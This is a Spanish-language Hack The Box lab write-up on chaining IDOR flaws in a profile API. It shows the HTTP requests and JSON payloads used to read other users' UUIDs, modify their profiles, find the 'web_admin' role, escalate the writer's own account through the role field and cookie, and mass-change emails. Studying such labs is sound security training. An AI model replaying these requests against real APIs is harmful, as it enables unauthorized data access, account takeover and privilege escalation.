
## 1. Identificar IDOR en una API mediante GET

En la sección anterior comprobamos que las peticiones `PUT`, `POST` y `DELETE` parecían tener controles de acceso. Sin embargo, todavía no habíamos probado si era posible obtener información de otros usuarios mediante `GET`.

La aplicación utiliza el endpoint:

```
GET /profile/api.php/profile/2 HTTP/1.1
Host: SERVER_IP:PORT
Cookie: role=employee
```

La petición devuelve los datos del usuario solicitado, incluyendo su `uid`, `uuid` y `role`:

```
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

Esto confirma una vulnerabilidad **IDOR Information Disclosure**: podemos consultar información de otro usuario sin una autorización adecuada.

### ¿Qué información obtenemos?

- `uid`: identificador del usuario.
    
- `uuid`: identificador adicional necesario para modificar su perfil.
    
- `role`: rol asignado al usuario.
    
- `full_name`: nombre completo.
    
- `email`: correo electrónico.
    
- `about`: descripción del perfil.
    

El dato más importante es `uuid`, porque anteriormente no podíamos modificar otros perfiles sin conocer el valor correspondiente.

## 2. Encadenar la divulgación de información con una modificación IDOR

Ahora podemos combinar dos vulnerabilidades:

1. **IDOR Information Disclosure:** permite obtener los datos de otros usuarios mediante `GET`.
    
2. **IDOR Insecure Function Calls:** permite modificar esos usuarios mediante `PUT` sin autorización adecuada.
    

### Paso 1. Obtener los datos del usuario

Realizamos una petición:

```
GET /profile/api.php/profile/2 HTTP/1.1
Host: SERVER_IP:PORT
Cookie: role=employee
```

Guardamos los valores `uid` y `uuid` que devuelve la API.

### Paso 2. Modificar el perfil

Utilizamos el endpoint correspondiente al usuario:

```
PUT /profile/api.php/profile/2 HTTP/1.1
Host: SERVER_IP:PORT
Content-Type: application/json
Cookie: role=employee
```

El cuerpo JSON contiene los datos del usuario, incluyendo su UUID válido:

```
{
    "uid": 2,
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Nombre Modificado",
    "email": "nuevo@example.com",
    "about": "Descripción modificada"
}
```

La petición puede completarse porque ahora proporcionamos el UUID correspondiente al usuario solicitado.

### Paso 3. Verificar los cambios

Volvemos a consultar el perfil:

```
GET /profile/api.php/profile/2 HTTP/1.1
Host: SERVER_IP:PORT
Cookie: role=employee
```

Si los nuevos datos aparecen en la respuesta, confirmamos que hemos modificado el perfil de otro usuario.

**Concepto clave:** una vulnerabilidad permite obtener la información necesaria para superar las comprobaciones que impedían explotar la segunda vulnerabilidad.

---

## 3. Posibles impactos de modificar perfiles ajenos

Una vez que podemos modificar los datos de otros usuarios, aparecen nuevas posibilidades de ataque.

### Cambiar el correo electrónico

Si el sistema de recuperación de contraseñas envía los enlaces a la dirección registrada en el perfil, modificar el correo podría permitir controlar la cuenta.

Este ataque depende de que el flujo de recuperación no tenga controles adicionales que lo impidan.

### Inyectar XSS

El campo `about` podría aceptar contenido que posteriormente se interprete como HTML o JavaScript.

Si la aplicación no escapa ni sanitiza correctamente ese contenido, podría existir una vulnerabilidad de Cross-Site Scripting (XSS).

La posibilidad de ejecutar código depende de cómo se almacene y represente el contenido.

## 4. Enumerar usuarios y localizar un administrador

La vulnerabilidad de divulgación de información también permite enumerar perfiles y buscar usuarios con roles privilegiados.

En el laboratorio encontramos un usuario con estos datos:

```
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

El valor `X` representa el identificador del administrador indicado por el ejercicio.

El dato importante es:

```
{
    "role": "web_admin"
}
```

Ahora conocemos el nombre exacto del rol administrativo que acepta la aplicación.

### ¿Por qué es importante?

Anteriormente, al intentar establecer `admin` o `administrator`, la API respondía:

```
Invalid role
```

El problema era que no conocíamos un rol válido. La enumeración de usuarios nos ha permitido descubrir `web_admin`.

## 5. Escalada de privilegios mediante el parámetro role

Interceptamos una petición de actualización de nuestro perfil y cambiamos el valor:

```
{
    "role": "employee"
}
```

por:

```
{
    "role": "web_admin"
}
```

En el laboratorio, la API acepta el cambio porque no aplica una comprobación adecuada de autorización para asignar roles.

Después, consultamos nuestro perfil y verificamos que el rol se ha actualizado:

```
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

### Actualizar la cookie

La aplicación utiliza una cookie relacionada con el rol:

```
Cookie: role=employee
```

Después de cambiar el rol, podemos recargar la página para actualizar la cookie o probar el nuevo valor en el laboratorio:

```
Cookie: role=web_admin
```

La aplicación permite entonces realizar operaciones administrativas que antes estaban restringidas, como crear usuarios.

**Importante:** el laboratorio demuestra que el servidor confía indebidamente en datos controlados por el cliente para gestionar los privilegios.

---

## 6. Crear usuarios con privilegios administrativos

Una vez que tenemos el rol `web_admin`, podemos volver a probar la operación de creación de usuarios.

Enviamos una petición `POST` al endpoint de la API con los datos del nuevo usuario.

Antes, la aplicación respondía:

```
Creating new employees is for admins only
```

Con el nuevo rol, el laboratorio permite completar la operación.

Después, una petición `GET` al perfil creado permite verificar que el usuario existe.

El mismo principio puede aplicarse a otras funciones administrativas, como la eliminación de usuarios.

## 7. Encadenamiento de vulnerabilidades

El ataque completo sigue esta secuencia:

```
IDOR Information Disclosure
          |
          v
Obtener uid, uuid y role de otros usuarios
          |
          v
IDOR Insecure Function Calls
          |
          v
Modificar perfiles de otros usuarios
          |
          v
Enumerar roles válidos
          |
          v
Asignar role=web_admin al usuario propio
          |
          v
Actualizar la cookie utilizada por la aplicación
          |
          v
Acceder a funciones administrativas
```

Una vulnerabilidad que parecía limitada a revelar información termina permitiendo una escalada de privilegios.

### Asignaciones masivas

El laboratorio también plantea modificar el correo electrónico de todos los usuarios.

La metodología consiste en:

1. Enumerar los perfiles.
    
2. Obtener el `uid` y el `uuid` de cada usuario.
    
3. Construir una petición `PUT` para cada perfil.
    
4. Cambiar el campo `email`.
    
5. Comprobar si la modificación se ha aplicado.
    

Esta técnica automatiza los cambios sobre múltiples cuentas, aunque requiere que las peticiones estén autorizadas por las condiciones del laboratorio.

## 8. Metodología para HTB

Cuando encuentres una API de perfiles:

1. Intercepta las peticiones con Burp Suite.
    
2. Prueba `GET` modificando el identificador del perfil.
    
3. Comprueba si la respuesta revela información de otros usuarios.
    
4. Guarda los identificadores `uid` y `uuid`.
    
5. Prueba `PUT` con los datos correspondientes al usuario objetivo.
    
6. Comprueba si puedes modificar su perfil.
    
7. Enumera los usuarios para descubrir roles privilegiados.
    
8. Investiga si el campo `role` puede modificarse sin autorización.
    
9. Verifica si las funciones administrativas aplican controles de acceso en el servidor.
    
10. Comprueba el resultado de cada operación mediante nuevas peticiones `GET`.

### Concepto clave para el examen

**Encadenar vulnerabilidades IDOR consiste en combinar varios fallos para conseguir un impacto mayor que el de cada vulnerabilidad por separado.**

En este laboratorio, la divulgación de información proporciona los UUID necesarios para modificar perfiles, mientras que la asignación insegura de roles permite escalar privilegios y acceder a funciones administrativas.
